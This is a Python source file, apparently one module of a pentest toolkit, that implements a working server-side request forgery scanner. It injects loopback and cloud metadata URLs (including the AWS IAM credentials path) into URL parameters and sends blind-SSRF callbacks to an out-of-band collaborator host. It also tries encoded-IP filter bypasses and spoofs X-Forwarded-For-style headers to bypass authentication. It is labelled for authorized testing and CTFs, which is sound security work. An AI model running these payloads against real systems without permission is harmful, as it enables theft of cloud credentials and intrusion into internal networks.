# -*- coding: utf-8 -*-
"""
MEOW-SEC :: SSRF — Server-Side Request Forgery Tester (Module #62)
For authorized security testing and CTF challenges only.
"""
import os, re, json, time
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

from core.ui import (console, ok, err, info, warn, find, show_module_banner,
                     ask_target, ask_choice, print_result_table, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk
from core.proxy_manager import px as _px

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ─── CONSTANTS ───────────────────────────────────────────────

_HEADERS = {
    "User-Agent": "Mozilla/5.0 (authorized-pentest-ssrf)",
    "Accept": "application/json, text/html, */*",
}

# Parameters commonly used to pass URLs — prime SSRF targets
_SSRF_PARAMS = [
    "url", "uri", "path", "redirect", "next", "callback", "webhook",
    "target", "dest", "src", "image", "file", "load", "fetch",
    "proxy", "link", "host", "endpoint",
]

# Loopback / internal payloads for classic SSRF
_INTERNAL_URLS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:22/",
]

# Cloud metadata endpoints
_CLOUD_META = [
    # AWS
    ("AWS  meta-data root",       "http://169.254.169.254/latest/meta-data/"),
    ("AWS  IAM credentials",      "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("AWS  AMI-ID",               "http://169.254.169.254/latest/meta-data/ami-id"),
    ("AWS  instance-id",          "http://169.254.169.254/latest/meta-data/instance-id"),
    # GCP
    ("GCP  metadata internal",    "http://metadata.google.internal/computeMetadata/v1/"),
    ("GCP  169.254.169.254",      "http://169.254.169.254/computeMetadata/v1/"),
    ("GCP  project-id",           "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
    # Azure
    ("Azure instance",            "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    # DigitalOcean
    ("DigitalOcean metadata",     "http://169.254.169.254/metadata/v1/"),
    ("DigitalOcean interfaces",   "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address"),
    # Oracle Cloud
    ("Oracle Cloud instance",     "http://169.254.169.254/opc/v1/instance/"),
]

# Bypass encodings for 127.0.0.1
_BYPASS_URLS = [
    ("octal",        "http://0177.0.0.1/"),
    ("hex",          "http://0x7f000001/"),
    ("decimal",      "http://2130706433/"),
    ("short",        "http://127.1/"),
    ("nip.io DNS",   "http://127.0.0.1.nip.io/"),
    ("@-trick",      "http://attacker@127.0.0.1/"),
    ("IPv6 full",    "http://[::ffff:127.0.0.1]/"),
    ("IPv6 short",   "http://[::ffff:7f00:1]/"),
    ("0x7f.0.0.1",   "http://0x7f.0.0.1/"),
    ("127.000.0.1",  "http://127.000.0.1/"),
]

# Headers that may cause server-side requests to internal IPs
_SSRF_HEADERS = [
    "X-Forwarded-For",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Client-IP",
    "X-Real-IP",
    "X-Forwarded-Host",
    "X-Host",
    "True-Client-IP",
    "CF-Connecting-IP",
]

# ─── HTTP HELPER ─────────────────────────────────────────────

def _req(method, url, **kwargs):
    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("verify", False)
    kwargs.setdefault("proxies", _px())
    kwargs.setdefault("allow_redirects", False)   # important: catch 302 redirects
    try:
        return requests.request(method, url, **kwargs)
    except Exception:
        return None

# ─── COMPARE HELPER ──────────────────────────────────────────

def _is_different(baseline, r) -> bool:
    """Return True when the response looks meaningfully different from baseline."""
    if r is None:
        return False
    if r.status_code != baseline.status_code:
        return True
    # Same status but notably different body size (>100 bytes delta or >20% change)
    base_len = len(baseline.content) or 1
    diff = abs(len(r.content) - base_len)
    if diff > 100 and diff / base_len > 0.2:
        return True
    return False

# ─── MODULE 1 — CLASSIC SSRF (auto param detection) ──────────

def _test_classic_ssrf(url: str, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ Classic SSRF — parameter injection[/]")

    parsed    = urlparse(url)
    base_url  = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params_qs = parse_qs(parsed.query)

    # Collect params to fuzz: existing ones + known SSRF names
    params_to_test = list(params_qs.keys())
    for p in _SSRF_PARAMS:
        if p not in params_to_test:
            params_to_test.append(p)

    if not params_to_test:
        info("No query params detected — using known SSRF param names only")

    # Baseline
    baseline = _req("GET", url, headers=_HEADERS, cookies=cookies)
    if baseline is None:
        err("Baseline request failed")
        return []

    findings = []
    for param in params_to_test:
        for ssrf_url in _INTERNAL_URLS:
            test_params = {k: v[0] for k, v in params_qs.items()}
            test_params[param] = ssrf_url
            test_url = base_url + "?" + urlencode(test_params)

            r = _req("GET", test_url, headers=_HEADERS, cookies=cookies)
            if r is None:
                continue

            if r.status_code in (200, 201) or _is_different(baseline, r):
                label = "VULN" if r.status_code in (200, 201) else "DIFF"
                find(f"SSRF [{label}] ?{param}={ssrf_url}  →  HTTP {r.status_code}  ({len(r.content)} B)")
                findings.append({
                    "type":    "classic_ssrf",
                    "param":   param,
                    "payload": ssrf_url,
                    "url":     test_url,
                    "status":  r.status_code,
                    "size":    len(r.content),
                })
            else:
                console.print(f"  [{DM}]  {param}={ssrf_url:<35}  →  {r.status_code}[/]")

    return findings

# ─── MODULE 2 — CLOUD METADATA SSRF ──────────────────────────

def _test_cloud_metadata(url: str, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ Cloud Metadata SSRF[/]")

    parsed    = urlparse(url)
    base_url  = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params_qs = parse_qs(parsed.query)

    # Pick the first SSRF-likely param or the first existing param
    existing = list(params_qs.keys())
    ssrf_params = [p for p in existing if p.lower() in _SSRF_PARAMS]
    if not ssrf_params:
        ssrf_params = existing[:1] if existing else ["url"]

    baseline = _req("GET", url, headers=_HEADERS, cookies=cookies)
    if baseline is None:
        err("Baseline request failed")
        return []

    findings = []
    for label, meta_url in _CLOUD_META:
        for param in ssrf_params:
            test_params = {k: v[0] for k, v in params_qs.items()}
            test_params[param] = meta_url
            test_url = base_url + "?" + urlencode(test_params)

            # Cloud metadata headers required for some providers (GCP)
            cloud_headers = {**_HEADERS, "Metadata-Flavor": "Google"}
            r = _req("GET", test_url, headers=cloud_headers, cookies=cookies)
            if r is None:
                continue

            if r.status_code in (200, 201):
                find(f"CLOUD META [{label}]  →  HTTP {r.status_code}  ({len(r.content)} B)  ?{param}=")
                findings.append({
                    "type":     "cloud_metadata",
                    "provider": label,
                    "param":    param,
                    "payload":  meta_url,
                    "url":      test_url,
                    "status":   r.status_code,
                    "size":     len(r.content),
                    "snippet":  r.text[:200],
                })
            elif r.status_code in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                warn(f"REDIRECT [{label}]  →  {r.status_code}  Location: {loc}")
            else:
                console.print(f"  [{DM}]  {label:<35}  →  {r.status_code}[/]")

    return findings

# ─── MODULE 3 — BLIND SSRF (callback URL) ────────────────────

def _test_blind_ssrf(url: str, callback_url: str, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ Blind SSRF — callback: {callback_url}[/]")

    parsed    = urlparse(url)
    base_url  = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params_qs = parse_qs(parsed.query)

    existing    = list(params_qs.keys())
    ssrf_params = [p for p in existing if p.lower() in _SSRF_PARAMS]
    if not ssrf_params:
        ssrf_params = existing[:1] if existing else ["url"]

    ts = datetime.now().strftime("%H%M%S")
    payloads = [
        f"{callback_url}/ssrf-test-{ts}",
        f"{callback_url}/ssrf-blind?t={ts}",
    ]

    findings = []
    info("Payloads sent — watch your callback listener for incoming requests:")
    for param in ssrf_params:
        for payload in payloads:
            test_params = {k: v[0] for k, v in params_qs.items()}
            test_params[param] = payload
            test_url = base_url + "?" + urlencode(test_params)

            r = _req("GET", test_url, headers=_HEADERS, cookies=cookies)
            status = r.status_code if r else "ERR"
            console.print(f"  [{G2}]  sent[/]  [{DM}]{param}={payload}  →  {status}[/]")
            findings.append({
                "type":    "blind_ssrf",
                "param":   param,
                "payload": payload,
                "url":     test_url,
                "status":  status,
                "note":    "Check callback listener for incoming DNS/HTTP request",
            })

    warn("Blind SSRF: this tester cannot auto-confirm hits — check your callback URL manually.")
    return findings

# ─── MODULE 4 — BYPASS TECHNIQUES ────────────────────────────

def _test_bypass(url: str, param: str, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ SSRF Bypass Encodings[/]  [{DM}](param: {param})[/]")

    parsed    = urlparse(url)
    base_url  = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params_qs = parse_qs(parsed.query)

    baseline = _req("GET", url, headers=_HEADERS, cookies=cookies)
    if baseline is None:
        err("Baseline request failed")
        return []

    findings = []
    for tech, bypass_url in _BYPASS_URLS:
        test_params = {k: v[0] for k, v in params_qs.items()}
        test_params[param] = bypass_url
        test_url = base_url + "?" + urlencode(test_params)

        r = _req("GET", test_url, headers=_HEADERS, cookies=cookies)
        if r is None:
            console.print(f"  [{DM}]  [{tech:<15}]  {bypass_url:<40}  →  ERR[/]")
            continue

        if r.status_code in (200, 201) or _is_different(baseline, r):
            find(f"BYPASS [{tech}]  {bypass_url}  →  HTTP {r.status_code}  ({len(r.content)} B)")
            findings.append({
                "type":    "bypass_ssrf",
                "tech":    tech,
                "payload": bypass_url,
                "url":     test_url,
                "status":  r.status_code,
                "size":    len(r.content),
            })
        else:
            console.print(f"  [{DM}]  [{tech:<15}]  {bypass_url:<40}  →  {r.status_code}[/]")

    return findings

# ─── MODULE 5 — HEADER INJECTION SSRF ────────────────────────

def _test_header_ssrf(url: str, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ SSRF Header Injection[/]")

    baseline = _req("GET", url, headers=_HEADERS, cookies=cookies)
    if baseline is None:
        err("Baseline request failed")
        return []

    findings = []
    for header in _SSRF_HEADERS:
        injected = {**_HEADERS, header: "127.0.0.1"}
        r = _req("GET", url, headers=injected, cookies=cookies)
        if r is None:
            console.print(f"  [{DM}]  {header:<35}  →  ERR[/]")
            continue

        if r.status_code in (200, 201) and baseline.status_code in (401, 403):
            find(f"HEADER SSRF [{header}: 127.0.0.1]  →  HTTP {r.status_code}  (auth bypass!)")
            findings.append({
                "type":    "header_ssrf",
                "header":  header,
                "value":   "127.0.0.1",
                "url":     url,
                "status":  r.status_code,
                "note":    "Auth bypass via header injection",
            })
        elif _is_different(baseline, r):
            warn(f"HEADER DIFF [{header}]  →  {r.status_code}  (diff: {len(r.content) - len(baseline.content):+d} B)")
            findings.append({
                "type":    "header_ssrf",
                "header":  header,
                "value":   "127.0.0.1",
                "url":     url,
                "status":  r.status_code,
                "note":    "Response differs with injected header",
            })
        else:
            console.print(f"  [{DM}]  {header:<35}  →  {r.status_code}[/]")

    return findings

# ─── SAVE ─────────────────────────────────────────────────────

def _save(target: str, findings: list):
    if not findings:
        return
    os.makedirs("data", exist_ok=True)
    safe = re.sub(r"[^\w.-]", "_", urlparse(target).netloc or target)[:40]
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"data/ssrf_{safe}_{ts}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({
            "target":   target,
            "findings": findings,
            "ts":       datetime.now().isoformat(),
            "total":    len(findings),
        }, f, indent=2)
    ok(f"Saved → {fname}")

# ─── MAIN ─────────────────────────────────────────────────────

def run():
    show_module_banner("ssrf")
    if not HAS_REQUESTS:
        err("requests not installed — run: pip install requests"); return

    console.print(f"\n  [{CY}]SSRF Tester[/]  [{DM}]— Server-Side Request Forgery[/]\n")

    url = ask_target("Target URL (e.g. https://site.com/api?url=...)")
    if not url:
        return
    if not url.startswith("http"):
        url = "http://" + url

    console.print(f"\n  [{CY}]Mode:[/]")
    console.print(f"  [{G2}][1][/] Scan automatique  (param detection + cloud metadata)")
    console.print(f"  [{G2}][2][/] Test manuel        (paramètre + URL spécifique)")
    console.print(f"  [{G2}][3][/] Blind SSRF         (callback / OOB)")
    console.print(f"  [{G2}][4][/] Bypass encodings   (octal, hex, decimal, DNS rebind…)")
    console.print(f"  [{G2}][5][/] Header injection   (X-Forwarded-For, X-Real-IP…)")
    console.print(f"  [{G2}][6][/] All tests")

    mode = ask_choice("Mode")
    if mode not in ("1", "2", "3", "4", "5", "6"):
        warn("Invalid mode"); return

    cookie_str = ask_choice("Session cookie (name=value; n2=v2) [Enter to skip]")
    cookies: dict = {}
    if cookie_str and "=" in cookie_str:
        for part in cookie_str.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k.strip()] = v.strip()

    all_findings: list = []

    # ── Mode 1 / 6 — auto scan ──────────────────────────────
    if mode in ("1", "6"):
        all_findings += _test_classic_ssrf(url, cookies)
        all_findings += _test_cloud_metadata(url, cookies)

    # ── Mode 2 — manual param + URL ─────────────────────────
    if mode == "2":
        param = ask_choice("Parameter name (e.g. url, redirect, src)")
        if not param:
            warn("Parameter name required"); return
        target_url = ask_choice("SSRF payload URL (e.g. http://127.0.0.1/ or http://169.254.169.254/latest/meta-data/)")
        if not target_url:
            warn("Payload URL required"); return

        parsed    = urlparse(url)
        base_url  = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params_qs = parse_qs(parsed.query)

        baseline = _req("GET", url, headers=_HEADERS, cookies=cookies)
        if baseline is None:
            err("Baseline request failed"); return

        test_params = {k: v[0] for k, v in params_qs.items()}
        test_params[param] = target_url
        test_url = base_url + "?" + urlencode(test_params)

        r = _req("GET", test_url, headers=_HEADERS, cookies=cookies)
        if r is None:
            err("Request failed"); return

        if r.status_code in (200, 201) or _is_different(baseline, r):
            find(f"SSRF [manual] ?{param}={target_url}  →  HTTP {r.status_code}  ({len(r.content)} B)")
            all_findings.append({
                "type":    "manual_ssrf",
                "param":   param,
                "payload": target_url,
                "url":     test_url,
                "status":  r.status_code,
                "size":    len(r.content),
                "snippet": r.text[:300],
            })
            console.print(f"\n  [{G2}]Response snippet:[/]")
            console.print(f"  [{DM}]{r.text[:400]}[/]")
        else:
            info(f"HTTP {r.status_code}  ({len(r.content)} B) — no obvious difference from baseline")

    # ── Mode 3 / 6 — blind SSRF ─────────────────────────────
    if mode in ("3", "6"):
        console.print(f"\n  [{CY}]Blind SSRF callback URL:[/]")
        console.print(f"  [{DM}]Examples: https://webhook.site/xxx  |  http://ssrf.burpcollaborator.net  |  https://interactsh.com/xxx[/]")
        callback = ask_choice("Callback URL [Enter for default burpcollaborator placeholder]")
        if not callback:
            callback = "http://ssrf.burpcollaborator.net"
        all_findings += _test_blind_ssrf(url, callback, cookies)

    # ── Mode 4 / 6 — bypass ─────────────────────────────────
    if mode in ("4", "6"):
        param = ask_choice("Parameter name to inject bypass payloads into (e.g. url)")
        if param:
            all_findings += _test_bypass(url, param, cookies)
        else:
            warn("Skipping bypass — no parameter specified")

    # ── Mode 5 / 6 — header injection ───────────────────────
    if mode in ("5", "6"):
        all_findings += _test_header_ssrf(url, cookies)

    # ── Results ─────────────────────────────────────────────
    console.print()
    confirmed = [f for f in all_findings if f.get("type") not in ("blind_ssrf",)]

    if confirmed:
        cat_talk(CAT_FOUND, f"{len(confirmed)} SSRF finding(s) confirmed!", G1)
        rows = [
            [
                f.get("type",    "?"),
                f.get("param",   f.get("header", "?")),
                (f.get("payload", f.get("value", "?")) or "")[:50],
                str(f.get("status", "?")),
                str(f.get("size",   "?")),
            ]
            for f in confirmed
        ]
        print_result_table("SSRF Findings", ["Type", "Param/Header", "Payload", "Status", "Size"], rows)
    elif all_findings:
        cat_talk(CAT_SCAN, f"{len(all_findings)} blind payload(s) sent — check your callback listener.", CY)
    else:
        cat_talk(CAT_SCAN, "No SSRF detected — target may filter internal URLs or require different parameters.", DM)

    _save(url, all_findings)
